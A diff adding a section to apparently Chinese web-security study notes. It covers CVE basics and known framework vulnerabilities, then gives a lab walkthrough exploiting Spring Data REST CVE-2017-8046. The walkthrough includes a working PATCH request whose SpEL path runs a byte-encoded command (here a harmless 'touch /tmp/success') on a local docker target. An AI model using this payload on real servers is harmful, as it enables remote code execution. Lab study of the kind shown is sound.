@@ -3946,6 +3946,154 @@ Linux 用户分为管理员和普通用户，普通用户又分为系统用户�
 
 ## 框架安全 
 
+### CVE
+
+- CVE- Common Vulnerabilities & Exposures
+- 广泛认同的信息安全漏洞或者已经暴露出来的弱点给出的一个公共名称。
+- 认定的一般流程：
+  - 发现—>公开—>编号—>提案—>修改—>中间决策—>最终决策—>正式发布—>（再评估）—>（撤销） 
+- 官网：https://cve.mitre.org/
+
+
+
+### 框架安全
+
+- 随着应用开发的复杂度提升，很难再有完全从零开发的web应用，而更多的是使用web框架，很大一部分开源框架得到了全世界的开发者支持，具备更加强大功能和完善的支持。
+- 正因如此，开源的框架使用的范围越来越广，最大程度的减小了网站开发的难度和时间。
+- 但是开源框架的问题在于，他的源码被全世界的开发者所阅读，小型框架的漏洞非常容易被人发现，而大型框架也不意味着安全，复杂的调用关系并不能杜绝漏洞被人所发现。
+- 一旦一个大型框架出现漏洞，那么黑客相当于拿到了所有使用这个框架的网站的通行证。几乎所有的大型框架都出现过漏洞，影响范围非常广。 
+- 常见的框架与漏洞
+  - struct2 作为曾经世界上最流行的 Java Web框架之一，广泛应用于教育、金融、互联网、通信等重要行业，直到目前仍然被大量使用。
+    - Struct2 ： CVE-2018-11776 远程代码执行漏洞 高危
+  - spring 是目前基于java的最流行的框架，大部分的java大型项目都直接或间接的使用了spring 框架。
+    - Spring ： CVE-2017-8046 远程代码执行漏洞 高危
+  - ThinkPHP是一套开源的、基于PHP的轻量级Web应用开发框架, 5.1.23之前版本中存在SQL注入漏洞。
+    - Thinkphp:   CVE-2018-16385 SQL 注入  高危
+  - django 是python 方向企业级框架，是开发者的首选框架。
+    -  Django ： CVE-2020-7471 SQL 注入  高危 
+
+
+
+### spring-data-rest 靶机
+
+- 启动 docker
+- docker pull registry.cn-shanghai.aliyuncs.com/yhskc/spring-data-rest
+- docker run -d -p 0.0.0.0:80:8080 registry.cn-shanghai.aliyuncs.com/yhskc/spring-data-rest
+- docker ps
+- docker rename compassionate_northcutt spring-data-rest
+
+
+
+### spring-data-rest (CVE-2017-8046) 
+
+- CVE-2017-8046 是代码审计和分析的信息服务公司Semmle发现并提交的漏洞 
+
+- Spring Data Rest设计的目的是消除curd的模板代码，减少程序员的刻板的重复劳动,增删改查动作分别对应四种请求类型：post、delete、update/patch、get。
+
+- Spring 3.2 开始支持 PATCH 方法，但要选对部署的容器。
+
+- op代表操作，必须存在，只能由6种明确表示操作的词汇组成，每一个操作结果作为下一个操作的对象，如果发生错误即返回错误信息，则全部变更不生效,成功返回204。 
+
+- PATCH
+
+  - PATCH 方法是 HTTP 协议新引入的，是对 PUT 方法的补充，使用 JSON 格式数据来对已知资源进行局部更新。 由 RFC6902 所约束，需包含 path 和 op 字段，具有自己的 MIME 类型：application/json-patch+json。 
+
+  - ![1617974623774](HackerMeWeb.assets/1617974623774.png)
+
+  - json 格式
+
+    - ```json
+      // 一个 JSON 文档 A ：
+      {
+      	"foo": "bar"
+      }
+      
+      // 文档 A
+      {
+          "foo": "bar",
+          "baz": "qux"
+      }
+      ```
+
+  - PATCH 简单示例
+
+    - ![1617974774405](HackerMeWeb.assets/1617974774405.png)
+
+- spring-data-rest 源码地址
+
+  - https://github.com/spring-guides/gs-accessing-data-rest
+
+- 靶机测试 curl
+
+  - 添加用户
+    - curl -X POST -H "Content-Type: application/json-patch+json" -d '{"firstname":"rm","lastname":"liu"}' http://127.0.0.1/customers
+  - 删除用户
+    - curl -X DELETE -H "Content-Type: application/json-patch+json" -d '{"firstname":"rm","lastname":"liu"}' http://127.0.0.1/customers/2
+  - 备注：这两个操作，我本机测试失败了，不知道原因！
+
+- 靶机测试 BurpSuite 
+
+  - 使用 BurpSuite 拦截请求报文 
+
+    - 需要设置浏览器代理
+    - 如果域名无法解析，需要使用 switchhost 工具
+
+  - 浏览器访问下面链接
+
+    - http://xforburp.com/
+    - http://xforburp.com/customers
+    - http://xforburp.com/customers/1
+
+  - 在 burp 中可以看到对应的三条记录
+
+  - 将 http://xforburp.com/customers/1 请求，对应的内容右键发送到 Repeater 中，可以看到请求的内容为
+
+    - ```http
+      GET /customers/1 HTTP/1.1
+      Host: xforburp.com
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0
+      Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+      Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+      Accept-Encoding: gzip, deflate
+      Connection: close
+      Cookie: security_level=0
+      Upgrade-Insecure-Requests: 1
+      ```
+
+  - 更改GET请求为PATCH请求，并添加上Content-Type，附加上 op，更改后的内容为
+
+    - ```http
+      PATCH /customers/1 HTTP/1.1
+      Host: xforburp.com
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0
+      Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+      Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+      Accept-Encoding: gzip, deflate
+      Connection: close
+      Cookie: security_level=0
+      Upgrade-Insecure-Requests: 1
+      Content-Type: application/json-patch+json
+      
+      [{ "op": "replace", "path": "T(java.lang.Runtime).getRuntime().exec(new java.lang.String(new byte[]{116,111,117,99,104,32,47,116,109,112,47,115,117,99,99,101,115,115}))/lastname", "value": "test" }]
+      ```
+
+  - 点击 Send，此时可以获得结果
+
+  - 登录 bash 交互式环境
+
+    - docker exec -it spring-data-rest bash
+    - cd /tmp/
+    - ls -al
+      - 此时，可以看到一个刚刚创建的文件 success
+      - 此时就完成了漏洞利用
+    - ![1617976269822](HackerMeWeb.assets/1617976269822.png)
+
+
+
+### 探究 CVE-2017-8046 
+
+
+
 
 
 
